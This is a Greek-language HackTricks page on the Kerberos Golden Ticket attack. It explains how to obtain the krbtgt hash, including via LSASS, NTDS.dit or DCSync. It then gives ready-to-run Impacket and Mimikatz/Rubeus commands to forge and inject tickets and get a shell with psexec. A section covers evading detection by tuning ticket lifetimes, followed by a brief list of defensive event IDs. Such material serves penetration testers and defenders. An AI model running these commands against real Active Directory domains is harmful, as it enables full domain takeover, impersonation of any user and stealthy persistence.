# Χρυσό εισιτήριο

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Χρυσό εισιτήριο

Η επίθεση με το **Χρυσό Εισιτήριο** αποτελείται από τη **δημιουργία ενός νόμιμου εισιτηρίου παροχής εισιτηρίων (TGT) που προσομοιώνει οποιονδήποτε χρήστη** μέσω της **NTLM κατακερματισμένης τιμής του λογαριασμού krbtgt του Active Directory (AD)**. Αυτή η τεχνική είναι ιδιαίτερα επωφελής επειδή **επιτρέπει την πρόσβαση σε οποιαδήποτε υπηρεσία ή μηχάνημα** εντός του τομέα ως ο προσομοιωμένος χρήστης. Είναι σημαντικό να θυμόμαστε ότι οι διαπιστευτήρια του λογαριασμού krbtgt **δεν ενημερώνονται αυτόματα**.

Για να **αποκτήσετε την NTLM κατακερματισμένη τιμή** του λογαριασμού krbtgt, μπορούν να χρησιμοποιηθούν διάφορες μεθόδοι. Μπορεί να εξαχθεί από τη διεργασία **Local Security Authority Subsystem Service (LSASS)** ή από το αρχείο **NT Directory Services (NTDS.dit)** που βρίσκεται σε οποιονδήποτε ελεγκτή τομέα (DC) εντός του τομέα. Επιπλέον, μια άλλη στρατηγική για την απόκτηση αυτής της NTLM κατακερματισμένης τιμής είναι η εκτέλεση μιας επίθεσης DCsync, η οποία μπορεί να πραγματοποιηθεί χρησιμοποιώντας εργαλεία όπως το **lsadump::dcsync module** στο Mimikatz ή το **script secretsdump.py** από το Impacket. Είναι σημαντικό να τονίσουμε ότι για την πραγματοποίηση αυτών των λειτουργιών, συνήθως απαιτούνται δικαιώματα διαχειριστή τομέα ή ένα παρόμοιο επίπεδο πρόσβασης.

Παρόλο που η NTLM κατακερματισμένη τιμή αποτελεί μια εφικτή μέθοδο για αυτόν τον σκοπό, **συνιστάται ιδιαίτερα** να **πλαστογραφούνται τα εισιτήρια χρησιμοποιώντας τα κλειδιά κρυπτογράφησης Advanced Encryption Standard (AES) Kerberos (AES128 και AES256)** για λόγους λειτουργικής ασφάλειας.


{% code title="Από Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% code title="Από τα Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Μόλις** έχετε το **χρυσό εισιτήριο ενσωματωμένο**, μπορείτε να έχετε πρόσβαση στα κοινόχρηστα αρχεία **(C$)** και να εκτελέσετε υπηρεσίες και WMI, οπότε μπορείτε να χρησιμοποιήσετε το **psexec** ή το **wmiexec** για να λάβετε ένα κέλυφος (φαίνεται ότι δεν μπορείτε να λάβετε ένα κέλυφος μέσω του winrm).

### Παράκαμψη συχνών ανιχνεύσεων

Οι πιο συχνοί τρόποι ανίχνευσης ενός χρυσού εισιτηρίου είναι μέσω **επιθεώρησης της κίνησης Kerberos** στο δίκτυο. Από προεπιλογή, το Mimikatz **υπογράφει το TGT για 10 χρόνια**, το οποίο θα ξεχωρίσει ως ανώμαλο στις επόμενες αιτήσεις TGS που γίνονται με αυτό.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Χρησιμοποιήστε τις παραμέτρους `/startoffset`, `/endin` και `/renewmax` για να ελέγξετε την αρχική καθυστέρηση, τη διάρκεια και το μέγιστο αριθμό ανανεώσεων (όλα σε λεπτά).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Δυστυχώς, ο χρόνος ζωής του TGT δεν καταγράφεται στα 4769, οπότε δεν θα βρείτε αυτές τις πληροφορίες στα αρχεία καταγραφής συμβάντων των Windows. Ωστόσο, αυτό που μπορείτε να συσχετίσετε είναι **η παρατήρηση 4769 χωρίς προηγούμενο 4768**. Δεν είναι δυνατόν να ζητηθεί ένα TGS χωρίς ένα TGT και αν δεν υπάρχει καταγραφή εκδόσεως TGT, μπορούμε να υποθέσουμε ότι δημιουργήθηκε απομονωμένα.

Για να **αποφύγετε αυτόν τον έλεγχο ανίχνευσης**, ελέγξτε τα diamond tickets:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Αντιμετώπιση

* 4624: Είσοδος λογαριασμού
* 4672: Είσοδος διαχειριστή
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Άλλα μικρά κόλπα που μπορούν να κάνουν οι υπερασπιστές είναι **η ειδοποίηση για τα 4769 για ευαίσθητους χρήστες**, όπως ο προεπιλεγμένος λογαριασμός διαχειριστή του τομέα.

## Αναφορές
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο github.

</details>
